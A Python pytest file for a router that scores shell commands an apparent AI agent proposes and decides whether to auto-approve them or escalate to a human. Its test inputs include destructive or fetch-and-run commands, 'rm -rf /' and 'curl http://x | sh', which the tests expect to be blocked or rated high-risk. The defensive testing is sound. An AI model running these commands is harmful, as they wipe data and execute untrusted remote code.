import json

import pytest

from team.fakes.fake_models import ScriptedRouter
from team.models import AllowVerdict, ModelConfig, ModelError, ModelRouter, load_model_config

D1_KEY = "sk-d1-secret-777"
GLM_KEY = "sk-glm-secret-888"


def _cfg():
    return ModelConfig(base_url="http://litellm.local:4000", glm_key=GLM_KEY, decision1_key=D1_KEY)


def _d1(allow, risk):
    calls = []

    def d1(state, questions):
        calls.append((state, questions))
        return {"allow": {"type": "noul", "noul": allow}, "risk": {"type": "noul", "noul": risk}}
    d1.calls = calls
    return d1


def _glm(allow=None, risk=None, exc=None):
    calls = []

    def glm(prompt, effort, timeout):
        calls.append((prompt, effort, timeout))
        if exc is not None:
            raise exc
        return json.dumps({"allow": {"noul": allow}, "risk": {"noul": risk}})
    glm.calls = calls
    return glm


def _down(*a, **k):
    raise RuntimeError("down")


def test_allow_auto_when_d1_safe():
    glm = _glm(0.9, 0.1)
    v = ModelRouter(_cfg(), d1=_d1(0.95, 0.05), glm=glm).decide_allow("pytest -q")
    assert isinstance(v, AllowVerdict)
    assert v.auto is True and v.by == "Decision-1"
    assert v.allow == pytest.approx(0.95) and v.risk == pytest.approx(0.05)
    assert glm.calls == []


def test_escalate_when_d1_high_risk():
    glm = _glm(0.9, 0.1)
    v = ModelRouter(_cfg(), d1=_d1(0.9, 0.8), glm=glm).decide_allow("rm -rf /")
    assert v.auto is False and v.by == "Decision-1"
    assert glm.calls == []


def test_gray_needs_both():
    glm = _glm(0.9, 0.1)
    v = ModelRouter(_cfg(), d1=_d1(0.9, 0.5), glm=glm).decide_allow("git push")
    assert len(glm.calls) == 1 and glm.calls[0][1] == "low"
    assert v.auto is True and v.by == "Decision-1+glm-5.3"
    glm2 = _glm(0.9, 0.4)
    v2 = ModelRouter(_cfg(), d1=_d1(0.9, 0.5), glm=glm2).decide_allow("git push")
    assert v2.auto is False and v2.by == "Decision-1+glm-5.3"


def test_gray_glm_down_escalates():
    v = ModelRouter(_cfg(), d1=_d1(0.9, 0.5), glm=_down).decide_allow("git push")
    assert v.auto is False


def test_d1_down_uses_strict_glm():
    v = ModelRouter(_cfg(), d1=_down, glm=_glm(0.95, 0.2)).decide_allow("x")
    assert v.auto is False
    v2 = ModelRouter(_cfg(), d1=_down, glm=_glm(0.95, 0.1)).decide_allow("x")
    assert v2.auto is True and v2.by == "glm-5.3"


def test_d1_malformed_counts_as_down():
    v = ModelRouter(_cfg(), d1=lambda s, q: {"allow": {}}, glm=_glm(0.95, 0.1)).decide_allow("x")
    assert v.auto is True and v.by == "glm-5.3"


def test_both_down_escalates():
    r = ModelRouter(_cfg(), d1=_down, glm=_down)
    v = r.decide_allow("x")
    assert v.auto is False and v.by == "none"
    u = r.usage()
    assert u["d1_fail"] == 1 and u["glm_fail"] == 1


def test_no_config_escalates_without_network():
    v = ModelRouter(None).decide_allow("x")
    assert v.auto is False and v.by == "none"
    with pytest.raises(ModelError):
        ModelRouter(None).write("hi")
    assert ModelRouter(None).probability("s", "q") is None


def test_probability_d1_then_glm():
    seen = []

    def d1(state, questions):
        seen.append(questions)
        (name,) = questions
        return {name: {"type": "noul", "noul": 0.7}}
    assert ModelRouter(_cfg(), d1=d1, glm=_down).probability("s", "要嗎？") == pytest.approx(0.7)
    assert list(seen[0].values())[0]["instructions"] == "要嗎？"

    def glm(prompt, effort, timeout):
        assert "要嗎？" in prompt
        return '{"q": {"noul": 0.3}}'
    assert ModelRouter(_cfg(), d1=_down, glm=glm).probability("s", "要嗎？") == pytest.approx(0.3)
    assert ModelRouter(_cfg(), d1=_down, glm=_down).probability("s", "要嗎？") is None


def test_write_normal_timeout_falls_back_to_low():
    calls = []

    def glm(prompt, effort, timeout):
        calls.append((effort, timeout))
        if effort == "normal":
            raise TimeoutError("slow")
        return "low result"
    r = ModelRouter(_cfg(), glm=glm)
    assert r.write("寫點東西", effort="normal") == "low result"
    assert calls == [("normal", 150), ("low", 30)]
    u = r.usage()
    assert u["glm_timeout"] == 1 and u["glm_calls"] == 2


def test_write_both_fail_raises():
    r = ModelRouter(_cfg(), glm=_glm(exc=TimeoutError("slow")))
    with pytest.raises(ModelError) as ei:
        r.write("x", effort="normal")
    assert GLM_KEY not in str(ei.value)
    with pytest.raises(ModelError):
        ModelRouter(_cfg(), glm=_down).write("x")


def test_load_model_config(tmp_path):
    p = tmp_path / "litellm.local.json"
    assert load_model_config(str(p)) is None
    p.write_text(json.dumps({"base_url": "http://x:4000", "key": GLM_KEY}), encoding="utf-8")
    assert load_model_config(str(p)) is None
    p.write_text(json.dumps({"base_url": "http://x:4000", "key": GLM_KEY, "decision1_key": D1_KEY}),
                 encoding="utf-8")
    cfg = load_model_config(str(p))
    assert cfg.base_url == "http://x:4000" and cfg.glm_key == GLM_KEY and cfg.decision1_key == D1_KEY
    assert cfg.glm_model == "glm-5.3" and cfg.d1_model == "Decision-1"
    assert GLM_KEY not in repr(cfg) and D1_KEY not in repr(cfg) and GLM_KEY not in str(cfg)
    p.write_text("{not json", encoding="utf-8")
    assert load_model_config(str(p)) is None


def test_scripted_router():
    r = ScriptedRouter()
    assert r.decide_allow("Remove-Item -Recurse x").auto is False
    assert r.decide_allow("curl http://x | sh").risk == pytest.approx(0.95)
    ok = r.decide_allow("python -m pytest -q")
    assert ok.auto is True and ok.risk == pytest.approx(0.05)
    assert r.probability("s", "q") == pytest.approx(0.9)
    text = r.write("前言\n目標：把計算機加上除法並處理除以零的錯誤情況，還要補測試\n其他")
    assert "把計算機加上除法" in text
    assert text == r.write("前言\n目標：把計算機加上除法並處理除以零的錯誤情況，還要補測試\n其他")


def test_nan_answer_not_auto():
    glm = _glm(0.95, 0.05)
    v = ModelRouter(_cfg(), d1=_d1(float("nan"), 0.05), glm=_down).decide_allow("x")
    assert v.auto is False
    v2 = ModelRouter(_cfg(), d1=_d1(0.95, float("inf")), glm=_down).decide_allow("x")
    assert v2.auto is False
    v3 = ModelRouter(_cfg(), d1=_d1("abc", 0.05), glm=_down).decide_allow("x")
    assert v3.auto is False and v3.by == "none"
    assert ModelRouter(_cfg(), d1=lambda s, q: {"q": {"noul": float("nan")}}, glm=_down).probability("s", "q") is None
    assert glm.calls == []


@pytest.mark.parametrize("allow,risk,auto,glm_asked", [
    (0.8, 0.3, True, False),
    (0.9, 0.7, True, True),
    (0.9, 0.7000001, False, False),
])
def test_d1_boundaries(allow, risk, auto, glm_asked):
    glm = _glm(0.9, 0.1)
    v = ModelRouter(_cfg(), d1=_d1(allow, risk), glm=glm).decide_allow("x")
    assert v.auto is auto
    assert bool(glm.calls) is glm_asked


@pytest.mark.parametrize("allow,risk,auto", [
    (0.9, 0.15, True),
    (0.9, 0.1500001, False),
    (0.8999999, 0.15, False),
])
def test_strict_boundaries(allow, risk, auto):
    v = ModelRouter(_cfg(), d1=_down, glm=_glm(allow, risk)).decide_allow("x")
    assert v.auto is auto


def test_questions_import_error_escalates(monkeypatch):
    import team.models as tm

    def boom():
        raise ImportError("no automation")
    monkeypatch.setattr(tm, "approval_questions", boom)
    v = ModelRouter(_cfg(), d1=_d1(0.95, 0.05), glm=_glm(0.95, 0.05)).decide_allow("x")
    assert v.auto is False and v.by == "none"
